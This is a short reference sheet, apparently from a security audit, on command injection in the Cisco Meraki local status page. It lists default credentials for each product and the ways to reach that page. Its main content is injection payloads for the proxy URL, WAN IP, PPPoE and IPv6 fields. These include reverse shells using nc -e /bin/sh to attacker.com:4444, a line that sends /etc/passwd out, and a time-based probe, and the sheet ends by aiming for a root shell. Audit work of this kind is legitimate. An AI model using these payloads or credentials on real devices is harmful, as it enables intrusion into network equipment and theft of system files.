# Meraki LSP Command Injection — Reference

## Source
Session: CDC Audit Cisco Meraki (2026-08-22)
Files: `meraki_step1_lsp_api_structure.md`, `meraki_cdc_final_report.md`

## Attack Surface

### Default Credentials (Per Firmware)
| Product | Firmware | Username | Password |
|---------|----------|----------|----------|
| MX | 19+ | admin | Serial Number |
| MS | 17+ | admin | Serial Number |
| MR | 32+ | admin | Serial Number |
| MG | 4.1.1+ | admin | Serial Number |
| All | Older | Serial Number | (empty) |

### LSP Access Methods
- **DNS Interception**: `mx.meraki.com`, `setup.meraki.com`, `my.meraki.com`, `switch.meraki.com`, `ap.meraki.com` → local LSP IP
- **Direct IPs**: MR `10.128.128.126`, MS `1.1.1.100`, MX LAN gateway, Campus Gateway `198.18.0.1`
- **TLS**: Port 8092 (MX 19.1+), self-signed `*.devices.meraki.direct` cert

### Configure Tab Injection Targets
| Field | Format | Injection Payload Example |
|-------|--------|---------------------------|
| HTTP Proxy URL | `http://proxy:port` | `http://$(nc -e /bin/sh attacker.com 4444):8080` |
| WAN IP / Gateway | IP/CIDR | `192.168.1.\`id\`` |
| PPPoE Username/Password | String | `\`id\`` |
| IPv6 Link-local | IPv6 | `fe80::\`id\`` |

### Command Injection Test Payloads
```bash
# Proxy URL - command substitution
http://$(nc -e /bin/sh attacker.com 4444):8080
http://`nc -e /bin/sh attacker.com 4444`:8080

# Blind injection
http://$(id > /tmp/pwned):8080
http://$(cat /etc/passwd | nc attacker.com 4444):8080

# Time-based
http://$(sleep 10):8080
```

## Verification Requirements
1. DevNet Sandbox reservation or physical device (MR46, MX67, MS225)
2. Serial number from label / DHCP / MAC OUI
3. LSP enabled (default), remote access enabled (default if local enabled)
4. Test each injection vector systematically
5. Achieve root shell → document with screenshots